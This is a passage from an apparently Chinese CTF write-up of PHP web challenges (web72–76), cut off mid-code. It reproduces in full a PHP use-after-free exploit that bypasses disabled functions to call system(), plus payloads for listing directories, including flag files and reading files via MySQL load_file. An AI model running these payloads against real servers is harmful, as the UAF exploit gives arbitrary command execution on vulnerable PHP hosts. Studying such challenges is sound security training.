输出条目的名称，并添加一个空格*</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查看到目录有flag0.txt文件</p>
<p>2、读取文件内容 </p>
<p>该题需要使用UAF脚本，利用了 php 的垃圾回收机制。代码涉及到偏移地址之类的</p>
<h3 id="UAF脚本"><a href="#UAF脚本" class="headerlink" title="UAF脚本"></a>UAF脚本</h3><p>UAF（Use After Free）漏洞的脚本通常涉及对已经被释放的内存块（堆块）的非法访问或操作。这种漏洞常常发生在编程中，当程序释放了一个内存块后，没有正确地将其指针置为空（NULL）或进行其他形式的清理，导致后续代码仍然可以通过该指针访问已经释放的内存区域。</p>
<p>在编写UAF漏洞的利用脚本时，攻击者通常会尝试执行以下步骤：</p>
<ol>
<li><strong>申请内存块</strong>：首先，攻击者会通过合法的手段（如malloc、new等）申请一个或多个内存块。</li>
<li><strong>释放内存块</strong>：接着，攻击者会释放其中一个或多个内存块，但故意不将相关的指针置为空。</li>
<li><strong>利用未置空的指针</strong>：在内存块被释放后，攻击者会尝试通过之前未置空的指针来访问或修改这块已经释放的内存区域。由于这块内存可能已经被重新分配给其他用途，因此这种访问或修改可能会导致不可预测的行为，包括信息泄露、任意代码执行等。</li>
<li><strong>实现攻击目标</strong>：通过精心构造的输入或操作，攻击者可以利用UAF漏洞实现各种攻击目标，如获取敏感信息、提升权限、执行任意代码等。</li>
</ol>
<p>这里直接给出大佬的脚本:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过url编码后传进去就可以拿到flag!</p>
<h1 id="web73–74"><a href="#web73–74" class="headerlink" title="web73–74"></a>web73–74</h1><p>73本题没有open_basedir限制，但74题是过滤了scandir()函数，所以都可以用72的伪协议去查看目录</p>
<p>试一下这个发现可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br></pre></td></tr></table></figure>

<p>也可以用72的伪协议去查看目录</p>
<p>include()函数也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure>

<h1 id="web75–76"><a href="#web75–76" class="headerlink" title="web75–76"></a>web75–76</h1><p>用伪协议查看文件目录 后发现这道题include_path限制了文件包含的路径，无法直接使用include包含得到flag信息,</p>
<p>这里直接摘抄大佬的wp里的payload:</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="comment"># 创建 PDO 实例, 连接 MySQL 数据库</span></span><br><span class="line">	<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。</span></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	